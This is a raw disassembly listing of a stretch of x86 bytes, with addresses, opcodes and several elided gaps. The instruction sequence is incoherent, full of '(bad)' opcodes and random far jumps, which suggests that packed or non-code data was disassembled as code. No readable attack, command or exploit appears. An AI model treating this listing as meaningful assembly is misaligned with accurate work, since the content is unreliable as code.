  41423a:	rol    esi,1
  41423c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41423d:	lahf   
  41423e:	inc    esp
  41423f:	dec    edi
  414240:	or     eax,eax
  414242:	ror    BYTE PTR [esi+0x280b42f0],0xe8
  414249:	mov    bh,0x82
  41424b:	mov    dh,0xa7
  41424d:	in     al,0xf0
  41424f:	test   BYTE PTR [ecx+0x4b],cl
  414252:	jg     0x4142d3
  414254:	xchg   ecx,eax
  414255:	xor    bh,BYTE PTR [edx+esi*8+0x23]
  414259:	mov    DWORD PTR [edi],ecx
  41425b:	test   DWORD PTR [ecx-0x29c56e09],esi
  414261:	rcl    DWORD PTR [ecx],1
  414263:	loop   0x414224
  414265:	adc    al,0x7d
  414267:	jne    0x414230
  414269:	cmp    eax,0x938859e7
  41426e:	sub    ah,cl
  414270:	retf   0xf732
  414273:	rcl    BYTE PTR [ecx+0x39],1
  414276:	dec    esi
  414277:	add    bl,ch
  414279:	pop    ecx
  41427a:	test   BYTE PTR [eax-0x20965a22],dh
  414280:	xchg   edx,eax
  414281:	or     BYTE PTR [eax+0x3f8820d4],ah
  414287:	test   esi,esp
  414289:	xchg   ebp,eax
  41428a:	jno    0x414309
  41428c:	psrlq  mm4,QWORD PTR [edx+0x179f8480]
  414293:	jb     0x414218
  414295:	retf   0xa412
  414298:	pop    esi
  414299:	add    al,0x7
  41429b:	je     0x414266
  41429d:	cdq    
  41429e:	ins    BYTE PTR es:[edi],dx
  41429f:	arpl   WORD PTR [eax],ax
  4142a1:	loop   0x41425c
  4142a3:	mov    bl,0x1d
  4142a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a6:	xchg   BYTE PTR [ecx-0x1e],dh
  4142a9:	lds    ebp,FWORD PTR [ecx+0x5eae47b7]
  4142af:	sub    BYTE PTR [edi+0x25cf806a],al
	...
  414315:	add    BYTE PTR [ecx],al
  414317:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0x66029990
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    ah,cl
  41432f:	stc    
  414330:	shr    DWORD PTR [edi+0x31],1
  414333:	(bad)
  414337:	pop    ebp
  414338:	rcl    BYTE PTR [edx-0x5b],1
  41433b:	lods   eax,DWORD PTR ds:[esi]
  41433c:	(bad)  
  41433d:	into   
  41433e:	xchg   edx,eax
  41433f:	mov    dl,0x23
  414341:	sahf   
  414342:	leave  
  414343:	pusha  
  414344:	rol    esp,0x50
  414347:	pop    ds
  414348:	int3   
  414349:	xlat   BYTE PTR ds:[ebx]
  41434a:	pushf  
  41434b:	and    al,0x48
  41434d:	rcl    ebp,1
  41434f:	dec    edx
  414350:	cmp    eax,0x69427d3b
  414355:	sbb    BYTE PTR [eax-0x7e8da954],bl
  41435b:	dec    ebp
  41435c:	jno    0x414325
  41435e:	fmulp  st(5),st
  414360:	or     eax,0xb2024708
  414365:	mov    ds:0x35db604a,eax
  41436a:	repnz and DWORD PTR [edx],eax
  41436d:	push   edi
  41436e:	cdq    
  41436f:	fwait
  414370:	mov    ds:0xc596d455,al
  414375:	lock frstor [ecx+0x5f218c63]
  41437c:	jns    0x4143d0
  41437e:	push   ebx
  414380:	(bad)  
  414382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414383:	inc    edi
  414384:	out    dx,eax
  414385:	lods   al,BYTE PTR ds:[esi]
  414386:	enter  0xdd9a,0x8a
  41438a:	and    BYTE PTR [ebx-0x80],dh
  41438d:	xchg   edx,eax
  41438e:	in     al,0x22
  414390:	or     BYTE PTR [esp+edi*2+0x57],0xa9
  414395:	dec    edx
  414396:	sbb    esi,ebx
  414398:	mov    edx,0x40b5e209
  41439d:	ins    DWORD PTR es:[edi],dx
  41439e:	iret   
  41439f:	mov    bl,0x13
  4143a1:	xchg   esi,eax
  4143a2:	cmp    BYTE PTR [ecx],0xaf
  4143a5:	add    BYTE PTR [eax],ah
  4143a7:	cld    
  4143a8:	mov    edx,0x77562e8
  4143ad:	add    BYTE PTR [esi+0x2274ec14],0xd5
  4143b4:	test   BYTE PTR [ecx-0x348dd7e0],bh
  4143ba:	dec    ebp
  4143bb:	daa    
  4143bc:	pop    esi
  4143be:	loopne 0x41435e
  4143c0:	dec    ebx
  4143c1:	mov    dl,0xa9
  4143c3:	aas    
  4143c4:	icebp  
  4143c5:	cmp    dl,BYTE PTR [esi-0x5e]
  4143c8:	rol    BYTE PTR [edi],0xba
  4143cb:	rcl    DWORD PTR [edx+0x2d],1
  4143ce:	sbb    al,0x9e
  4143d0:	retf   
  4143d1:	popa   
  4143d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143d3:	push   esp
  4143d4:	sbb    al,0x3d
  4143d6:	pop    edx
  4143d7:	das    
  4143d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d9:	cdq    
  4143da:	xchg   ebp,eax
  4143db:	js     0x414405
  4143dd:	shr    DWORD PTR [edx],0xa8
  4143e0:	mov    al,ds:0xb6727f00
  4143e5:	pop    eax
  4143e6:	in     al,dx
  4143e7:	push   edi
  4143e8:	cwde   
  4143e9:	rcr    ebp,1
  4143eb:	mov    bl,0x16
  4143ed:	adc    dl,BYTE PTR [eax+0x334d38d9]
  4143f3:	push   es
  4143f4:	dec    esp
  4143f5:	popa   
  4143f6:	dec    eax
  4143f7:	inc    edx
  4143f8:	ficomp DWORD PTR [ebx+0x107dc648]
  4143fe:	and    ecx,DWORD PTR [edi-0x33]
  414401:	daa    
  414402:	leave  
  414403:	adc    eax,0xea592622
  414408:	shl    ebp,1
  41440a:	sub    BYTE PTR [edx-0x511ddb88],al
  414410:	ffreep st(5)
  414412:	lods   eax,DWORD PTR ds:[esi]
  414413:	xchg   esi,eax
  414414:	lahf   
  414415:	xor    al,0x72
  414417:	xchg   edi,eax
  414418:	sbb    DWORD PTR [edi-0x62505b9b],ebp
  41441e:	das    
  41441f:	push   ebp
  414420:	cmp    ebp,DWORD PTR [eax]
  414422:	repz xchg ecx,eax
  414424:	or     al,0x73
  414426:	and    BYTE PTR [edi],cl
  414428:	and    esi,DWORD PTR [eax]
  41442a:	adc    al,0x3b
  41442c:	jae    0x4143eb
  41442e:	sub    al,0x1b
  414430:	mov    bl,0x33
  414432:	adc    al,0x22
  414434:	scas   al,BYTE PTR es:[edi]
	...
  414495:	add    BYTE PTR [ebx+0x73],bl
  414498:	inc    edx
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a3:	enter  0x38dc,0x9
  4144a7:	rol    DWORD PTR [eax],cl
  4144a9:	add    BYTE PTR [edi],al
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    dh,cl
  4144af:	hlt    
  4144b0:	xchg   ebx,eax
  4144b1:	cmp    edx,DWORD PTR [edx-0x11d036bf]
  4144b7:	pop    ebx
  4144b8:	lock loope 0x4144cf
  4144bb:	or     BYTE PTR [edx+0x26],cl
  4144be:	jmp    DWORD PTR [ebp-0x319efbe1]
  4144c4:	cmp    al,0xa2
  4144c6:	pop    edi
  4144c7:	rol    DWORD PTR [eax],0x2
  4144ca:	and    eax,0x670db38
  4144cf:	cli    
  4144d0:	repnz std 
  4144d2:	clc    
  4144d3:	bound  esi,QWORD PTR [ebp+0x71]
  4144d6:	or     ch,BYTE PTR [ecx+eax*8]
  4144d9:	lock pop ebp
  4144db:	mov    dh,0x55
  4144dd:	imul   edi,DWORD PTR [esi-0x46],0x400df85d
  4144e4:	int3   
  4144e5:	inc    ebx
  4144e6:	and    esp,DWORD PTR [ebx+edi*2-0x2]
  4144ea:	arpl   si,dx
  4144ec:	mov    ah,0xd2
  4144ee:	or     al,cl
  4144f0:	fistp  QWORD PTR [eax-0x38]
  4144f3:	inc    ebx
  4144f4:	loop   0x4144b0
  4144f6:	je     0x4144bf
  4144f8:	xrelease xchg BYTE PTR [ebp+0x50],bl
  4144fc:	xchg   ch,al
  4144fe:	adc    dh,bh
  414500:	pop    ds
  414501:	test   DWORD PTR [esi-0x57],edx
  414504:	pusha  
  414505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414506:	psubusw mm1,mm0
  414509:	inc    edi
  41450a:	push   ss
  41450b:	sub    eax,0xa55a1ec
  414510:	add    eax,0xaaced440
  414515:	pop    edi
  414516:	pop    edx
  414517:	push   ebx
  414518:	das    
  414519:	push   edi
  41451a:	fldcw  WORD PTR [eax-0x110d1188]
  414520:	ret    
  414521:	xor    al,0xdd
  414523:	adc    DWORD PTR [eax+0x1b],ebx
  414526:	pop    ebp
  414527:	in     al,0xe4
  414529:	mov    al,0x21
  41452b:	call   0xe842a8d0
  414530:	mov    dh,0xc
  414532:	xchg   esi,eax
  414533:	and    eax,0x740b6f10
  414538:	sbb    eax,0xbcf3a400
  41453d:	jne    0x4144e9
  41453f:	sub    eax,ebp
  414541:	add    esi,edx
  414543:	sbb    dl,dh
  414545:	sub    cl,ch
  414547:	or     al,0xa8
  414549:	sbb    esi,0x1a
  41454c:	sub    BYTE PTR [edi-0x28c46495],ah
  414552:	imul   esp,DWORD PTR [eax],0xffffff9c
  414555:	push   cs
  414556:	push   ecx
  414557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414558:	add    BYTE PTR [ebp+0x64],dh
  41455b:	push   0x76910832
  414560:	ds push ebx
  414562:	cmp    al,0xaf
  414564:	ds in  eax,dx
  414566:	jmp    0x4145c5
  414568:	adc    al,0x7
  41456a:	adc    dl,cl
  41456c:	imul   BYTE PTR [esi]
  41456e:	inc    ebp
  41456f:	mov    eax,ds:0x1c7ad3ca
  414574:	mov    ebx,0x97dbc1e4
  414579:	sub    ebx,0xd18c295e
  41457f:	pop    edi
  414580:	inc    eax
  414581:	in     eax,dx
  414582:	rol    cl,cl
  414584:	inc    esi
  414585:	xor    ebx,DWORD PTR [edx-0xaec808]
  41458b:	mov    al,bh
  41458d:	aas    
  41458e:	and    BYTE PTR [edi-0x6f],ah
  414591:	push   eax
  414592:	push   0xfffffffd
  414594:	ret    0x913
  414597:	sub    eax,0x3503cb00
  41459c:	outs   dx,DWORD PTR ds:[esi]
  41459d:	rol    BYTE PTR [esi],cl
  41459f:	aad    0xce
  4145a1:	inc    ebp
  4145a2:	mov    ds:0x657a48ec,al
  4145a7:	inc    edx
  4145a8:	(bad)  
  4145a9:	lock sar DWORD PTR [eax],0xba
  4145ad:	out    dx,eax
  4145ae:	ja     0x41455f
  4145b0:	pushf  
  4145b1:	jmp    0x9584b9
	...
  414616:	jg     0x414676
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0x30b60dc2
  414624:	pop    es
  414625:	retf   0xd410
  414628:	add    BYTE PTR [eax],al
  41462a:	pop    es
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR [ecx+0x1c7f61a5],ch
  414633:	cmp    eax,0xa981b17a
  414638:	xchg   esp,eax
  414639:	icebp  
  41463a:	(bad)  
  41463b:	retf   
  41463c:	test   BYTE PTR [eax],0xbb
  41463f:	test   al,0x12
  414641:	test   DWORD PTR [edx],esi
  414643:	push   edx
  414644:	addr16 enter 0x4250,0xef
  414649:	xchg   edx,eax
  41464a:	hlt    
  41464b:	mov    ss,WORD PTR [ebx-0x5769b7c3]
  414651:	rcl    DWORD PTR [edi],1
  414653:	mov    eax,ds:0x726ac1cf
  414658:	sbb    bh,bh
  41465a:	jmp    0x414639
  41465c:	xor    ebp,DWORD PTR [ebx+0x66]
  41465f:	xor    eax,0x578405d2
  414664:	inc    esi
  414665:	dec    edx
  414666:	or     eax,0xd2187f6b
  41466b:	cmp    ch,BYTE PTR [esi]
  41466d:	loopne 0x414644
  41466f:	ja     0x4146a2
  414671:	push   0xffffff88
  414673:	dec    edx
  414674:	stc    
  414675:	add    BYTE PTR [edx-0x34],0xad
  414679:	dec    edi
  41467a:	add    al,0xbe
  41467c:	pop    ebp
  41467d:	xor    DWORD PTR [eax+0x168ee9f],ebp
  414683:	imul   eax,DWORD PTR [esi],0x56
  414686:	(bad)  
  414687:	fdivr  DWORD PTR ds:0x9305de24
  41468d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41468e:	cmc    
  41468f:	pop    ss
  414690:	test   BYTE PTR [esi-0x5d],0x13
  414694:	ins    BYTE PTR es:[edi],dx
  414695:	and    al,0xcc
  414697:	mov    BYTE PTR [ebx+0x1ddec59a],dh
  41469d:	dec    edx
  41469e:	mov    ebx,ebp
  4146a0:	fimul  DWORD PTR [edi-0x4b412867]
  4146a6:	es pop esp
  4146a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a9:	adc    dl,ah
  4146ab:	jge    0x414651
  4146ad:	xor    al,0x24
  4146af:	jno    0x41470a
  4146b1:	arpl   WORD PTR [edi+0x3e0c436c],di
  4146b7:	pop    ebp
  4146b8:	mov    eax,ds:0xb5b956a4
  4146bd:	test   DWORD PTR [ebx],ebx
  4146bf:	adc    cl,BYTE PTR [ebp+0x21bc9d52]
  4146c5:	retf   0x3aab
  4146c8:	(bad)  
  4146c9:	jl     0x41467a
  4146cb:	cmp    edi,DWORD PTR [edi-0x56]
  4146ce:	pop    ebp
  4146cf:	loope  0x4146fd
  4146d1:	add    esi,esi
  4146d3:	out    dx,al
  4146d4:	xor    BYTE PTR [ecx+0x4ce159c5],al
  4146da:	push   edi
  4146db:	sub    ecx,ecx
  4146dd:	inc    edi
  4146de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146df:	jecxz  0x4146a2
  4146e1:	jge    0x414756
  4146e3:	out    dx,eax
  4146e4:	and    al,0xac
  4146e6:	(bad)  
  4146e7:	cmp    al,bl
  4146e9:	ja     0x41474b
  4146eb:	cmp    esp,DWORD PTR [eax]
  4146ed:	xlat   BYTE PTR ds:[ebx]
  4146ee:	mov    ebx,DWORD PTR [eax-0x55f03ad1]
  4146f4:	sub    al,0xac
  4146f6:	and    eax,0x674d2129
  4146fb:	clc    
  4146fc:	mov    ds:0x82db42f2,eax
  414701:	cmp    al,0xb4
  414703:	mov    cl,BYTE PTR [ecx+0x7bcaded]
  414709:	jae    0x414719
  41470b:	rcl    ebp,1
  41470d:	sahf   
  41470e:	jl     0x41471e
  414710:	sbb    eax,0x563febdf
  414715:	xor    DWORD PTR [eax],ebp
  414717:	jb     0x41470e
  414719:	(bad)  
  41471a:	stos   DWORD PTR es:[edi],eax
  41471b:	sbb    eax,DWORD PTR [edx-0x78fdc05d]
  414721:	sti    
  414722:	inc    esp
  414723:	push   esp
  414724:	jmp    0xb549:0xa87b5504
  41472b:	cdq    
  41472c:	inc    ebx
  41472d:	sbb    eax,0xa048b718
  414732:	les    eax,FWORD PTR [edx+0x18]
	...
  414794:	add    BYTE PTR [eax],al
  414796:	jle    0x4147c7
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	mov    esi,eax
  4147a4:	and    ecx,DWORD PTR [edi+edx*1-0x2b]
  4147a8:	add    BYTE PTR [eax],al
  4147aa:	pop    es
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    cl,dl
  4147af:	outs   dx,DWORD PTR ds:[esi]
  4147b0:	fidiv  WORD PTR [ecx]
  4147b2:	retf   0x820e
  4147b5:	dec    edi
  4147b6:	(bad)  
  4147b8:	cmovbe ecx,DWORD PTR [edi+0x1e7058af]
  4147bf:	and    ch,BYTE PTR [ecx-0x5b390e8d]
  4147c5:	push   ss
  4147c6:	aaa    
  4147c7:	mov    ds:0x1c504522,al
  4147cc:	xchg   edi,eax
  4147cd:	stos   BYTE PTR es:[edi],al
  4147ce:	not    BYTE PTR [edi]
  4147d0:	push   ecx
  4147d1:	jecxz  0x414764
  4147d3:	dec    ecx
  4147d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d5:	xlat   BYTE PTR ds:[ebx]
  4147d6:	pop    esi
  4147d7:	add    BYTE PTR [eax],al
  4147d9:	imul   ecx,eax,0x6326b4da
  4147df:	jmp    0x4147d3
  4147e1:	into   
  4147e2:	sub    DWORD PTR ds:0x8c67e245,ecx
  4147e8:	fcmove st,st(5)
  4147ea:	lea    ecx,[edx+0x2aab5ed2]
  4147f0:	mov    eax,ds:0x8644910a
  4147f5:	call   FWORD PTR [ecx+0xb]
  4147f8:	push   ebp
  4147f9:	gs inc esi
  4147fb:	bswap  edx
  4147fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147fe:	sbb    BYTE PTR [eax+0x7f28a40d],al
  414804:	test   DWORD PTR ds:0xc7f8ca05,ecx
  41480a:	xor    BYTE PTR [esi+edi*1],ah
  41480d:	stc    
  41480e:	mov    bl,0xa2
  414810:	inc    ebp
  414811:	cmp    BYTE PTR [edi-0x44],bh
  414814:	in     al,dx
  414815:	inc    eax
  414816:	dec    ebx
  414817:	lea    eax,[esi+edi*1-0x7bd3d720]
  41481e:	fistp  QWORD PTR [edi]
  414820:	cmp    dh,BYTE PTR [ecx]
  414822:	ds pop ss
  414824:	les    esi,FWORD PTR [esi+esi*4]
  414827:	rcl    BYTE PTR [edx],cl
  414829:	dec    edi
  41482a:	push   0xe7919e67
  41482f:	inc    edx
  414830:	mov    dh,0xd5
  414832:	ja     0x41480e
  414834:	cmp    al,0x9e
  414836:	add    BYTE PTR [esp+esi*8],dh
  414839:	aas    
  41483a:	fldcw  WORD PTR [ecx]
  41483c:	add    edi,esi
  41483e:	std    
  41483f:	jge    0x414821
  414841:	(bad)  
  414842:	xchg   ebp,eax
  414843:	fisttp WORD PTR [edi+0xe90761]
  414849:	inc    edi
  41484a:	dec    ebx
  41484b:	inc    ax
  41484d:	push   0x3b576fd0
  414852:	fcom   QWORD PTR [eax]
  414854:	xor    DWORD PTR [ebx+0x4babcf34],ecx
  41485a:	jne    0x4148da
  41485c:	(bad)  
  41485d:	sahf   
  41485e:	cmp    BYTE PTR [edi-0x9],al
  414861:	clc    
  414862:	cmp    ecx,edx
  414864:	inc    ebp
  414865:	shr    BYTE PTR [edx-0x187d1ed3],1
  41486b:	icebp  
  41486c:	jle    0x41480c
  41486e:	mov    al,ds:0x14fa209e
  414873:	dec    edi
  414874:	aad    0xfe
  414876:	je     0x41483c
  414878:	sub    DWORD PTR [ecx],ecx
  41487a:	or     eax,DWORD PTR [ebx+0x7c407b47]
  414880:	jg     0x41483f
  414882:	push   esp
  414883:	ror    BYTE PTR [esi+0x38],1
  414886:	xor    eax,0x718b80c7
  41488b:	dec    esp
  41488c:	icebp  
  41488d:	mov    ah,BYTE PTR [eax+0x14e6ff86]
  414893:	mov    dl,0x66
  414895:	add    BYTE PTR [ebx+0x55],ch
  414898:	inc    edx
  414899:	in     eax,0xad
  41489b:	lods   al,BYTE PTR ds:[esi]
  41489c:	and    DWORD PTR ds:0x74451449,edi
  4148a2:	das    
  4148a3:	mov    ds:0xa456caa3,al
  4148a8:	loopne 0x4148f9
  4148aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ab:	dec    cl
  4148ad:	cld    
  4148ae:	or     BYTE PTR [edx],ah
  4148b0:	jle    0x414912
  4148b2:	or     DWORD PTR [ebx-0x5e],ebx
	...
  414915:	add    BYTE PTR [ebx],cl
  414917:	jle    0x4148eb
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0x7d9c1ed
  414924:	(bad)  [eax+0x1e]
  414927:	(bad)  
  414928:	add    BYTE PTR [eax],al
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [ecx+0x4e4fe4c3],ch
  414933:	loope  0x41491b
  414935:	jbe    0x4149ae
  414937:	outs   dx,DWORD PTR ds:[esi]
  414938:	jmp    DWORD PTR [ecx+0x2a]
  41493b:	jno    0x414935
  41493d:	je     0x41491f
  41493f:	fdiv   DWORD PTR [edx+0x65]
  414942:	add    DWORD PTR [ecx],edi
  414944:	jp     0x414943
  414946:	(bad)  
  414948:	imul   esi,DWORD PTR [ecx+0x57],0xf7baf11e
  41494f:	es push ebx
  414951:	loopne 0x4149b5
  414953:	add    al,0xc8
  414956:	loop   0x414985
  414958:	rcl    DWORD PTR [eax],cl
  41495a:	mov    edx,0xc7c7ccad
  41495f:	dec    ebp
  414960:	imul   eax,DWORD PTR [edi],0x181f8d51
  414966:	into   
  414967:	mov    bl,0x67
  414969:	mov    DWORD PTR [ecx+0x6],esp
  41496c:	(bad)  
  41496d:	and    esp,DWORD PTR [edi]
  41496f:	das    
  414970:	xor    BYTE PTR [edx-0x58b6ef1a],ch
  414976:	inc    esp
  414977:	xchg   esp,eax
  414978:	neg    DWORD PTR [eax]
  41497a:	add    al,0xf3
  41497c:	add    ah,BYTE PTR [ebx]
  41497e:	mov    eax,DWORD PTR [ebp+0x3bf707e2]
  414984:	jmp    DWORD PTR [esi+0x24]
  414987:	aas    
  414988:	ss dec ecx
  41498a:	adc    eax,0x643ae998
  41498f:	adc    al,0xd7
  414991:	mov    dh,0xb6
  414993:	retf   
  414994:	adc    eax,0x742b2454
  414999:	repz sub BYTE PTR [edi],ah
  41499c:	add    al,0xfd
  41499e:	pop    eax
  41499f:	adc    dh,BYTE PTR [edi]
  4149a1:	sbb    esp,DWORD PTR [eax+edx*2-0x1e19237e]
  4149a8:	add    esp,DWORD PTR [ebp+0x64e0f42f]
  4149ae:	mov    ah,0xb
  4149b0:	jl     0x414a25
  4149b2:	xchg   ebx,eax
  4149b3:	ret    
  4149b4:	popa   
  4149b5:	cmc    
  4149b6:	push   esi
  4149b7:	shr    BYTE PTR es:[ebx+0x69],1
  4149bb:	fnstenv [eax+0x2f]
  4149be:	(bad)  
  4149bf:	fisubr DWORD PTR [ebx+0x4a]
  4149c2:	in     eax,dx
  4149c3:	gs in  eax,0x70
  4149c6:	out    dx,al
  4149c7:	xor    BYTE PTR [ebp+0x2b851be8],ch
  4149cd:	std    
  4149ce:	loopne 0x4149e5
  4149d0:	pop    ebp
  4149d1:	mov    ?,WORD PTR [ecx]
  4149d3:	imul   ebp,edx,0xde4d08d4
  4149d9:	ret    0xf1a2
  4149dc:	cdq    
  4149dd:	nop
  4149de:	cld    
  4149df:	call   0x645087fe
  4149e4:	mov    DWORD PTR [esi],edx
  4149e6:	xchg   edx,eax
  4149e7:	and    edi,DWORD PTR [ebp+ebx*1-0x68bdfce]
  4149ee:	lods   al,BYTE PTR ds:[esi]
  4149ef:	cld    
  4149f0:	sbb    ch,dl
  4149f2:	pop    edx
  4149f3:	and    eax,0xbf53cbd9
  4149f8:	cmp    eax,DWORD PTR [esi]
  4149fa:	inc    ebx
  4149fb:	cmp    esp,ebx
  4149fd:	out    0x6f,eax
  4149ff:	sub    BYTE PTR [ebp-0x32df6cc4],cl
  414a05:	fild   DWORD PTR [edx-0x5b]
  414a08:	jno    0x414a54
  414a0a:	xchg   ebx,eax
  414a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0c:	xor    eax,DWORD PTR [ebx]
  414a0e:	add    bl,BYTE PTR [edx]
  414a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a11:	sub    bh,dh
  414a13:	inc    eax
  414a14:	xchg   ebx,eax
  414a15:	and    esi,edx
  414a17:	popa   
  414a18:	add    DWORD PTR [esi],esp
  414a1a:	aad    0x83
  414a1c:	inc    edx
  414a1d:	push   ebx
  414a1e:	lea    esi,[eax+esi*8+0x38]
  414a22:	xor    BYTE PTR [ebp+0x10],bh
  414a25:	js     0x4149f2
  414a27:	sub    BYTE PTR ds:0xa2e9c8a8,ch
  414a2d:	gs retf 0x90a1
  414a31:	cli    
  414a32:	aam    0x15
  414a34:	pop    edi
	...
  414a95:	add    BYTE PTR [edi+0x7e363ed9],bl
  414a9b:	neg    DWORD PTR [edi-0x4d9bdb07]
  414aa1:	sbb    ebp,DWORD PTR [ecx+0x25e70cb5]
  414aa7:	xlat   BYTE PTR ds:[ebx]
  414aa8:	add    BYTE PTR [eax],al
  414aaa:	pop    es
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    ah,bl
  414aaf:	dec    ebp
  414ab0:	nop
  414ab1:	in     al,0xce
  414ab3:	adc    BYTE PTR [eax-0x6a],bh
  414ab6:	gs jg  0x414b07
  414ab9:	xor    al,0x5f
  414abb:	not    BYTE PTR [ecx-0x6a]
  414abe:	test   eax,0x47634819
  414ac3:	int    0x1c
  414ac5:	call   0xc8c9:0x962ef1e0
  414acc:	repz cdq 
  414ace:	scas   eax,DWORD PTR es:[edi]
  414acf:	shl    DWORD PTR [ebp+0x414b6908],cl
  414ad5:	adc    ebx,esp
  414ad7:	in     al,dx
  414ad8:	xchg   edi,eax
  414ad9:	clc    
  414ada:	xchg   ebp,eax
  414adb:	mov    bl,0x20
  414add:	neg    DWORD PTR [eax]
  414adf:	ja     0x414a87
  414ae1:	adc    ecx,DWORD PTR [ebp+0x468f641e]
  414ae7:	std    
  414ae8:	ds enter 0x9328,0xd4
  414aed:	sbb    BYTE PTR [esi-0x71027a3d],bh
  414af3:	and    cl,BYTE PTR [edi]
  414af5:	or     BYTE PTR [ebx-0x2b],al
  414af8:	bound  esp,QWORD PTR [esi]
  414afa:	mov    cl,0xe5
  414afc:	xchg   esi,eax
  414afd:	pop    edi
  414afe:	out    0xb7,al
  414b00:	pushf  
  414b01:	sbb    DWORD PTR [ebx-0x38e60b8a],edi
  414b07:	out    dx,eax
  414b08:	mov    BYTE PTR [esi],ch
  414b0a:	fwait
  414b0b:	cmp    al,BYTE PTR [esi-0x2d]
  414b0e:	lea    ebx,[ebx]
  414b10:	imul   esp,DWORD PTR [edi-0x77ce38ff],0x8daad07e
  414b1a:	enter  0xf39,0x31
  414b1e:	jbe    0x414ab5
  414b20:	dec    esp
  414b21:	dec    esp
  414b22:	retf   
  414b23:	shl    ah,0x39
  414b26:	cmp    BYTE PTR [edx+0x5dbaee26],cl
  414b2c:	xor    BYTE PTR [ebp-0x3c],0x90
  414b30:	pop    ds
  414b31:	mov    ds:0x56a3988a,eax
  414b36:	and    BYTE PTR [esi],cl
  414b38:	mul    dh
  414b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b3b:	(bad)  
  414b3c:	dec    eax
  414b3d:	mov    ah,0x4e
  414b3f:	loopne 0x414ba4
  414b41:	out    dx,eax
  414b42:	stos   DWORD PTR es:[edi],eax
  414b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b44:	and    dh,BYTE PTR [edi+edi*2-0x78]
  414b48:	fcmovnb st,st(3)
  414b4a:	adc    edx,esi
  414b4c:	and    DWORD PTR ds:0xb622bc29,0x11761d55
  414b56:	jmp    0x414b5d
  414b58:	jno    0x414bb8
  414b5a:	scas   eax,DWORD PTR es:[edi]
  414b5b:	inc    ebp
  414b5c:	push   ebp
  414b5d:	pop    es
  414b5e:	and    al,0xc3
  414b60:	or     eax,0xbd4c9ee
  414b65:	mov    esp,DWORD PTR [edi]
  414b67:	xchg   esp,eax
  414b68:	add    dh,BYTE PTR [edx]
  414b6a:	lock fnstcw WORD PTR [esi+0x59]
  414b6e:	ret    
  414b6f:	imul   ecx,DWORD PTR [ebx+0x1724ad31],0x58e190ef
  414b79:	jecxz  0x414bc6
  414b7b:	inc    edx
  414b7c:	mov    ebp,0xe6de34ab
  414b81:	sbb    al,0xb2
  414b83:	and    bh,BYTE PTR [ecx-0x76887a6b]
  414b89:	cmp    dl,BYTE PTR [eax+eiz*4-0x1b]
  414b8d:	mov    al,ds:0x52c6da7d
  414b92:	(bad)  
  414b93:	pop    edx
  414b94:	xor    BYTE PTR [eax-0x31742ff5],al
  414b9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b9b:	aaa    
  414b9c:	inc    edi
  414b9d:	mov    bh,0x4e
  414b9f:	pop    eax
  414ba0:	jne    0x414ba9
  414ba2:	adc    ebp,esp
  414ba4:	sbb    ebp,esp
  414ba6:	mov    ds:0x76c1b90d,al
  414bab:	mov    edx,0x5f09a63b
  414bb0:	mov    ch,0x59
  414bb2:	cmp    DWORD PTR [edi+0x71],0x0
	...
  414c16:	xor    al,0x64
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	jmp    0xd8:0x2c35b352
  414c29:	add    BYTE PTR [edi],al
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    ch,bl
  414c2f:	mov    bh,0x76
  414c31:	aam    0xb5
  414c33:	push   ebp
  414c34:	les    edi,FWORD PTR [ebx+0xb]
  414c37:	pop    edi
  414c38:	dec    esp
  414c39:	jecxz  0x414be0
  414c3b:	call   0x87d27392
  414c40:	shl    DWORD PTR [edi-0x55],0xb9
  414c44:	loope  0x414c30
  414c46:	xchg   edi,eax
  414c47:	jge    0x414bf7
  414c49:	pop    edi
  414c4a:	dec    eax
  414c4b:	xor    dl,0x2c
  414c4e:	not    BYTE PTR [edi+0x10eece29]
  414c54:	ja     0x414ca0
  414c56:	cdq    
